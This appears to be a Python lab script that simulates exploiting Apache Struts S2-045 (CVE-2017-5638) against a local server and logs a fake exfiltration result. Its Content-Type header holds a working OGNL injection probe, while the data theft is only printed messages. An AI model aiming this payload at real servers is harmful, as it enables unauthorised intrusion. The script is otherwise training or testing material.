#!/usr/bin/env python3

import os
import sys
import json
import datetime
import requests
import subprocess
import time

def simulate_struts_attack():
    """Simulate an attack on the vulnerable Struts application"""
    target_url = "http://127.0.0.1:8080"
    
    print("Simulating attack on vulnerable Struts application...")
    
    # Check if the system is vulnerable
    headers = {
        "Content-Type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Vulnerable','true')}.multipart/form-data"
    }
    
    try:
        response = requests.get(target_url, headers=headers, timeout=5)
        
        if 'X-Vulnerable' in response.headers:
            print("System is vulnerable to Struts S2-045 (CVE-2017-5638)")
            
            # Simulate data exfiltration
            print("Simulating data exfiltration...")
            
            # In a real attack, this would execute commands on the server
            # Here we're just simulating the attack
            
            # Simulate accessing the database
            print("Simulating access to database...")
            time.sleep(2)
            
            # Simulate exfiltrating customer data
            print("Simulating exfiltration of customer data...")
            time.sleep(2)
            
            # Log the attack
            attack_log = {
                "timestamp": datetime.datetime.now().isoformat(),
                "attack_type": "Struts S2-045 Exploitation",
                "target": "web_server",
                "success": True,
                "data_accessed": "customer_data database",
                "records_affected": 3
            }
            
            with open("attack_log.json", "w") as f:
                json.dump(attack_log, f, indent=2)
            
            print("Attack simulation completed. Log saved to attack_log.json")
            return True
        else:
            print("System is not vulnerable to Struts S2-045 (CVE-2017-5638)")
            return False
    
    except Exception as e:
        print(f"Error simulating attack: {e}")
        return False

def main():
    simulate_struts_attack()

if __name__ == "__main__":
    main()
